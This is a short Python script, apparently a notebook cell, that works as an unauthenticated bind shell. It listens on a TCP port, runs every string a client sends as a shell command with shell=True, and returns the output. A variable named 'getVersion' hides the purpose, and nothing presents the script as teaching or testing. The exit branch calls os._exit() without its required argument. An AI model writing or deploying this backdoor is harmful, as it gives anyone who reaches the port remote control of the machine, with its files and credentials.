# %%
import socket
import sys
import os
import subprocess
import _thread


def worker(c):
    while True:
        data = c.recv(1024).decode()
        if data == "q":
            os._exit()
        else:
            getVersion = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE).stdout
            version = getVersion.read()
            c.send(version)
    c.close()


def server_program():
    host = socket.gethostname()
    port = int(sys.argv[1])

    s = socket.socket()
    s.bind((host, port))
    s.listen(100)

    while True:
        c, addr = s.accept()
        print("Connection from : " + str(addr))
        _thread.start_new_thread(worker, (c,))
    s.close()


if __name__ == '__main__':
    server_program()
